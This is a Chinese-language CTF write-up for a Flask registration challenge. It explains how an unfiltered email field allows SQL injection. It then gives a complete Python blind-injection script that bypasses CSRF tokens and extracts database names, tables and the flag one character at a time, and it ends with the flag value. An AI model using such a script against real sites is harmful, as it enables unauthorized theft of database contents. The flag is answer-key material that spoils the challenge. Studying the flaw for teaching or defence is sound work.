# Web_python_flask_sql_injection

> 挺傻逼的一道题目

## 思路分析

> 下载附件,查看代码,发现基于flask框架.查看注册框架RegistrationForm发现对注册邮箱过滤不严格

> 查看邮箱验证函数validate_email跟入到mysql.One中,拼接sql语句为select id from user where email = 'your input email'

> 结合注入，拼接后的sql语句为

```
select id from user where email = 'test'/**/or/**/1=1#@test.com'
```

> 由于注入不回显,因此采用盲注,在邮箱验证函数中可以看到,当使用重复邮箱注册时,会进行提示.

> 构建exp（注册一个用户，然后将脚本中的邮箱改为和注册时相同的邮箱）

## payload

```
import requests
from bs4 import BeautifulSoup

url = "http://61.147.171.105:62385/register"

r = requests.get(url)
soup = BeautifulSoup(r.text,"html5lib")
token = soup.find_all(id='csrf_token')[0].get("value")

notice = "Please use a different email address."
result = ""

database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"
tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"
columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"
data = "(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)"


for i in range(1,100):
    for j in range(32,127):
        payload = "test'/**/or/**/ascii(substr("+  data +",%d,1))=%d#/**/@chybeta.com" % (i,j)
        post_data = {
            'csrf_token': token,
            'username': 'a',
            'email':payload,
            'password':'a',
            'password2':'a',
            'submit':'Register'
        }
        r = requests.post(url,data=post_data)
        soup = BeautifulSoup(r.text,"html5lib")
        token = soup.find_all(id='csrf_token')[0].get("value")
        if notice in r.text:
            result += chr(j)
            print(result)
            break
```

## flag

> ctf{6ca1e8b9-d37e-4da3-9679-fa446d8b9d36}